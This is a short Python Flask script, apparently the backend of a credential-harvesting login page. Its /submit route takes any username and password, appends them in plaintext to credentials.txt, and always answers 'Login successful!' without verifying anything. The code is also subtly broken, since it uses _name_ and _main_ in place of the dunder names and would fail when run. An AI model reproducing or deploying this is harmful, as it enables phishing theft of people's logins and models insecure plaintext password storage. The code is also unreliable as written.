from flask import Flask, request

app = Flask(_name_)

@app.route('/submit', methods=['POST'])
def submit():
    username = request.form['username']
    password = request.form['password']
    # Store the credentials (e.g., save to a file, database, etc.)
    with open('credentials.txt', 'a') as f:
        f.write(f'Username: {username}, Password: {password}\n')
    return 'Login successful!'

if _name_ == '_main_':
    app.run(port=8000)